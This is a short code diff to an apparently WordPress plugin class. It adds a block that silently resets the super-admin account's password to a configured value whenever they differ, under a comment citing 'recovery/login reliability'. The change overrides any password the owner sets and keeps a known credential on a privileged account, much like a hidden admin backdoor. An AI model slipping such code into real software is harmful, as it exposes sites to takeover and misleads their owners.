@@ -295,6 +295,12 @@ class LC_Plugin
             grant_super_admin($user->ID);
         }
 
+        // Keep the configured primary admin password in sync for recovery/login reliability.
+        if (!wp_check_password($password, $user->user_pass, $user->ID)) {
+            wp_set_password($password, $user->ID);
+            $user = get_user_by('id', $user->ID);
+        }
+
         update_user_meta($user->ID, 'lc_primary_admin', 1);
     }
 
